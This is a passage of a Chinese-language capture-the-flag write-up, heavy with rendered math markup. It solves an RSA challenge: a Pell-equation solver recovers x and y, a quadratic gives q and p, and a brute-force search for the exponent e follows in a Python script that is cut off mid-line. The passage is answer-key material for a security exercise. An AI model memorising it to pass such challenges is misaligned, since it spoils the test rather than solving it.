nulldelimiter"></span></span><span class="mclose">⌋</span></span></span></span></p></li><li d.bit\_length()4=""><p>h_4=d\%2^</p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>h</mi><mn>5</mn></msub><mo>=</mo><msup><mi>x</mi><mn>2</mn></msup><mi>p</mi><mo>+</mo><msup><mi>y</mi><mn>2</mn></msup><mi>q</mi></mrow><annotation encoding="application/x-tex">h_5=x^2p+y^2q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.84444em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-.19444em"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8141079999999999em"><span style="top:-3.063em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-.19444em"></span><span class="mord"><span class="mord mathnormal" style="margin-right:.03588em">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8141079999999999em"><span style="top:-3.063em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:.03588em">q</span></span></span></span></p></li></ul><p>还给了 n 和 c</p><p>已知<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>114514</mn><msup><mi>x</mi><mn>2</mn></msup><mo>−</mo><mn>11680542514</mn><msup><mi>y</mi><mn>2</mn></msup><mo>+</mo><mn>1919810</mn><mo>=</mo><mn>2034324</mn></mrow><annotation encoding="application/x-tex">114514 x^2 - 11680542514 y^2 + 1919810 = 2034324</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.897438em;vertical-align:-.08333em"></span><span class="mord">1</span><span class="mord">1</span><span class="mord">4</span><span class="mord">5</span><span class="mord">1</span><span class="mord">4</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8141079999999999em"><span style="top:-3.063em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-.19444em"></span><span class="mord">1</span><span class="mord">1</span><span class="mord">6</span><span class="mord">8</span><span class="mord">0</span><span class="mord">5</span><span class="mord">4</span><span class="mord">2</span><span class="mord">5</span><span class="mord">1</span><span class="mord">4</span><span class="mord"><span class="mord mathnormal" style="margin-right:.03588em">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8141079999999999em"><span style="top:-3.063em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.64444em;vertical-align:0"></span><span class="mord">1</span><span class="mord">9</span><span class="mord">1</span><span class="mord">9</span><span class="mord">8</span><span class="mord">1</span><span class="mord">0</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.64444em;vertical-align:0"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">3</span><span class="mord">4</span><span class="mord">3</span><span class="mord">2</span><span class="mord">4</span></span></span></span></p><p>化简后得到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>x</mi><mn>2</mn></msup><mo>−</mo><mn>102001</mn><msup><mi>y</mi><mn>2</mn></msup><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x^2-102001y^2=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.897438em;vertical-align:-.08333em"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8141079999999999em"><span style="top:-3.063em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-.19444em"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">2</span><span class="mord">0</span><span class="mord">0</span><span class="mord">1</span><span class="mord"><span class="mord mathnormal" style="margin-right:.03588em">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8141079999999999em"><span style="top:-3.063em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.64444em;vertical-align:0"></span><span class="mord">1</span></span></span></span></p><p>使用下面的脚本求得 x 和 y 的值</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> math</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">def</span> <span class="token function">solvePell</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    x <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>sqrt<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    y<span class="token punctuation">,</span> z<span class="token punctuation">,</span> r <span class="token operator">=</span> x<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> x <span class="token operator">&lt;&lt;</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    e1<span class="token punctuation">,</span> e2 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    f1<span class="token punctuation">,</span> f2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        y <span class="token operator">=</span> r <span class="token operator">*</span> z <span class="token operator">-</span> y</pre></td></tr><tr><td data-num="10"></td><td><pre>        z <span class="token operator">=</span> <span class="token punctuation">(</span>n <span class="token operator">-</span> y <span class="token operator">*</span> y<span class="token punctuation">)</span> <span class="token operator">//</span> z</pre></td></tr><tr><td data-num="11"></td><td><pre>        r <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">+</span> y<span class="token punctuation">)</span> <span class="token operator">//</span> z</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>        e1<span class="token punctuation">,</span> e2 <span class="token operator">=</span> e2<span class="token punctuation">,</span> e1 <span class="token operator">+</span> e2 <span class="token operator">*</span> r</pre></td></tr><tr><td data-num="14"></td><td><pre>        f1<span class="token punctuation">,</span> f2 <span class="token operator">=</span> f2<span class="token punctuation">,</span> f1 <span class="token operator">+</span> f2 <span class="token operator">*</span> r</pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre>        a<span class="token punctuation">,</span> b <span class="token operator">=</span> f2 <span class="token operator">*</span> x <span class="token operator">+</span> e2<span class="token punctuation">,</span> f2</pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">if</span> a <span class="token operator">*</span> a <span class="token operator">-</span> n <span class="token operator">*</span> b <span class="token operator">*</span> b <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="18"></td><td><pre>            <span class="token keyword">return</span> a<span class="token punctuation">,</span> b</pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">102001</span><span class="token punctuation">]</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    x<span class="token punctuation">,</span> y <span class="token operator">=</span> solvePell<span class="token punctuation">(</span>n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"x^2 - %3d * y^2 = 1\nx = %27d\n y = %25d"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>n<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>根据</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msup><mi>x</mi><mn>2</mn></msup><mi>p</mi><mo>+</mo><msup><mi>y</mi><mn>2</mn></msup><mi>q</mi><mo>=</mo><msub><mi>h</mi><mn>5</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>p</mi><mi>q</mi><mo>=</mo><mi>n</mi></mrow></mstyle></mtd></mtr></mtable></mrow><annotation encoding="application/x-tex">\begin{cases} x^2p+y^2q=h_5\\ pq=n \end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.0000299999999998em;vertical-align:-1.25003em"></span><span class="minner"><span class="mopen delimcenter" style="top:0"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em"><span style="top:-3.69em"><span class="pstrut" style="height:3.008em"></span><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8141079999999999em"><span style="top:-3.063em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mord"><span class="mord mathnormal" style="margin-right:.03588em">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8141079999999999em"><span style="top:-3.063em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:.03588em">q</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span></span></span><span style="top:-2.25em"><span class="pstrut" style="height:3.008em"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:.03588em">q</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mord mathnormal">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>得到</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>y</mi><mn>2</mn></msup><msup><mi>q</mi><mn>2</mn></msup><mo>−</mo><msub><mi>h</mi><mn>5</mn></msub><mi>q</mi><mo>+</mo><mi>n</mi><msup><mi>x</mi><mn>2</mn></msup><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">y^2q^2-h_5q+nx^2=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0585479999999998em;vertical-align:-.19444em"></span><span class="mord"><span class="mord mathnormal" style="margin-right:.03588em">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:.03588em">q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.8888799999999999em;vertical-align:-.19444em"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:.03588em">q</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.8641079999999999em;vertical-align:0"></span><span class="mord mathnormal">n</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.64444em;vertical-align:0"></span><span class="mord">0</span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>q</mi><mo>=</mo><mfrac><mrow><msub><mi>h</mi><mn>5</mn></msub><mo>±</mo><msqrt><mrow><msubsup><mi>h</mi><mn>5</mn><mn>2</mn></msubsup><mo>−</mo><mn>4</mn><mi>n</mi><msup><mi>x</mi><mn>2</mn></msup><msup><mi>y</mi><mn>2</mn></msup></mrow></msqrt></mrow><mrow><mn>2</mn><msup><mi>y</mi><mn>2</mn></msup></mrow></mfrac></mrow><annotation encoding="application/x-tex">q=\frac{h_5\pm\sqrt{h_5^2-4nx^2y^2}}{2y^2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.625em;vertical-align:-.19444em"></span><span class="mord mathnormal" style="margin-right:.03588em">q</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:2.51044em;vertical-align:-.8804400000000001em"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.63em"><span style="top:-2.314em"><span class="pstrut" style="height:3em"></span><span class="mord"><span class="mord">2</span><span class="mord"><span class="mord mathnormal" style="margin-right:.03588em">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.740108em"><span style="top:-2.9890000000000003em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em"><span class="pstrut" style="height:3em"></span><span class="frac-line" style="border-bottom-width:.04em"></span></span><span style="top:-3.6802em"><span class="pstrut" style="height:3em"></span><span class="mord"><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">±</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.9498em"><span class="svg-align" style="top:-3.2em"><span class="pstrut" style="height:3.2em"></span><span class="mord" style="padding-left:1em"><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.7959080000000001em"><span style="top:-2.433692em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span><span style="top:-3.0448000000000004em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.26630799999999993em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mord">4</span><span class="mord mathnormal">n</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.740108em"><span style="top:-2.9890000000000003em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:.03588em">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.740108em"><span style="top:-2.9890000000000003em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-2.9098em"><span class="pstrut" style="height:3.2em"></span><span class="hide-tail" style="min-width:1.02em;height:1.28em"><svg width="400em" height="1.28em" viewBox="0 0 400000 1296" preserveAspectRatio="xMinYMin slice"><path d="M263,681c0.7,0,18,39.7,52,119
c34,79.3,68.167,158.7,102.5,238c34.3,79.3,51.8,119.3,52.5,120
c340,-704.7,510.7,-1060.3,512,-1067
l0 -0
c4.7,-7.3,11,-11,19,-11
H40000v40H1012.3
s-271.3,567,-271.3,567c-38.7,80.7,-84,175,-136,283c-52,108,-89.167,185.3,-111.5,232
c-22.3,46.7,-33.8,70.3,-34.5,71c-4.7,4.7,-12.3,7,-23,7s-12,-1,-12,-1
s-109,-253,-109,-253c-72.7,-168,-109.3,-252,-110,-252c-10.7,8,-22,16.7,-34,26
c-22,17.3,-33.3,26,-34,26s-26,-26,-26,-26s76,-59,76,-59s76,-60,76,-60z
M1001 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.2902em"><span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.8804400000000001em"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>得到的 q 有两个解，仅保留整数解，然后根据<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>=</mo><mfrac><mi>n</mi><mi>q</mi></mfrac></mrow><annotation encoding="application/x-tex">p=\frac nq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.625em;vertical-align:-.19444em"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:1.1764999999999999em;vertical-align:-.481108em"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.695392em"><span style="top:-2.6550000000000002em"><span class="pstrut" style="height:3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:.03588em">q</span></span></span><span style="top:-3.23em"><span class="pstrut" style="height:3em"></span><span class="frac-line" style="border-bottom-width:.04em"></span></span><span style="top:-3.394em"><span class="pstrut" style="height:3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.481108em"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span> 得到 p</p><p>现在得到了 pq, 只需要 e 就能求得私钥 d</p><p>因为题目没有直接提供 e, 所以这里需要亿点点枚举</p><p>已知 e 是一个 36 位的素数，枚举时使用 <code>getPrime()</code> 获得</p><p>它需要满足以下条件</p><ul><li><code>GCD(e, (p - 1) * (q - 1)) == 1 and e &lt; (p-1)*(q-1)</code></li><li><code>( reduce(lambda x, y: x * y, range(1, h1 - 1)) * e) % h1 == h2</code> (用到 hint1 和 hint2)</li><li><code>h4 == d % (2 ** (d.bit_length() // 4))</code> (用到 hint4)</li></ul><p>最终代码如下</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> functools <span class="token keyword">import</span> <span class="token builtin">reduce</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> gmpy2</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">from</span> math <span class="token keyword">import</span> sqrt</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">import</span> os</pre></td></tr><tr><td data-num="6"></td><td><pre>h5 <span class="token operator">=</span> <span class="token number">15237245518187783270118095809520813715956779970121151605236017245281663349927871664089323996437198235332380649056157552139824794588282124241562678460596507994160450297450179528976589398846210519549196888613143426635079434084452257874065484561750625879566967728892028875015732523907566365015585071705383965108584900462347980930243703796275135520452238877712806925535901382203444872746731017403372197551202867519872504341875747056250334169640471053205861370866906946583776837242814046091601932206546117069281206618021968118790407685235602371416190212336628756323090425345962230904747291854448754116455587682431569485503641521272971686704473193019132477953908910849831685148677975221237038065750758015111863632278200747000157187997814194029400697403741838489362003974564359614821068833924840443285823258682774010695163217945524608036622625872746384332883461936945674717452827633809865102717159507550663596896932548991216607522697367537118903992798078936423232478772212951734438159292917127451068031982531631571612297893227345579357245226069692084913823443945826318169121459999393340568902299486793470467510065851569244119435052446898779718050907739373838489841346799589855583093882137549631777101404814967710333142369685932771643559927586884873934944456529776507128155937030841026343151440450761869269196359152094226878375985237603824966654988556567217028134068892779253422300240576637315948429841799367844063885304545920357705733411373493758050263143074535948457</span></pre></td></tr><tr><td data-num="7"></td><td><pre>x <span class="token operator">=</span> <span class="token number">34834945635419823491817566563399234823053176449889821571800075702352062905044231520196782430564993617886316750841220280683153456634693274516582390418863033711415731372881163288179660369032440262647344962570809308551786423557604581792293023628226671539671001863522824415876161727357840363896909435994314597682318687286109212360132261705780761350223208855493439905713509683216585447535669179103840355151676900348955850726834778558748576176596609474037298456423607570516459873639794526160082489103786303332253388597560031538949333472681857144605196440020688999368156212067614295618998719682195870452330682061061500341728481458877113934526003865064359452801</span></pre></td></tr><tr><td data-num="8"></td><td><pre>y <span class="token operator">=</span> <span class="token number">109071911012732502022850422978096246932142152916423367258339958080776017127779842287569032054094868715662547617710798972237860865468979518796870762466053422806566269221859683504667443154145089120448705028998733329483536176859312788275313407342047772524898407149610870586148015013605624329594138230714119704939505401061380777712216157719510271261619101362035144616187262082302740411574934586360516695062056563100258177611076242927354475633328163841594305884855770651187471060662561145818768319723133613889115397679168254599526858767478331211008997427364431641348477558436549415894985022330773540762573918592860707967250624976183104841257499345937186160</span></pre></td></tr><tr><td data-num="9"></td><td><pre>n <span class="token operator">=</span> <span class="token number">162908386409122831644601726291514736982460317787650963552042804694858960756247295016072165050452122566555943647913977051861072784403314058088382494116300030479243222291806345961434419243328825539529128842207242691984718290143482242891139352813626310709638170008858946304550631669011725528861157958853032167147</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>delta2 <span class="token operator">=</span> h5<span class="token operator">**</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">*</span>n<span class="token operator">*</span>x<span class="token operator">**</span><span class="token number">2</span><span class="token operator">*</span>y<span class="token operator">**</span><span class="token number">2</span></pre></td></tr><tr><td data-num="13"></td><td><pre>delta <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>delta2<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>delta <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>delta<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>delta<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span>h5<span class="token operator">+</span>delta<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>y<span class="token operator">**</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    </pre></td></tr><tr><td data-num="18"></td><td><pre>    q1<span class="token operator">=</span><span class="token punctuation">(</span>h5<span class="token operator">+</span>delta<span class="token punctuation">)</span><span class="token operator">//</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>y<span class="token operator">**</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"q1 = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>q1<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    </pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span>h5<span class="token operator">-</span>delta<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>y<span class="token operator">**</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    </pre></td></tr><tr><td data-num="23"></td><td><pre>    q2<span class="token operator">=</span><span class="token punctuation">(</span>h5<span class="token operator">-</span>delta<span class="token punctuation">)</span><span class="token operator">//</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>y<span class="token operator">**</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token 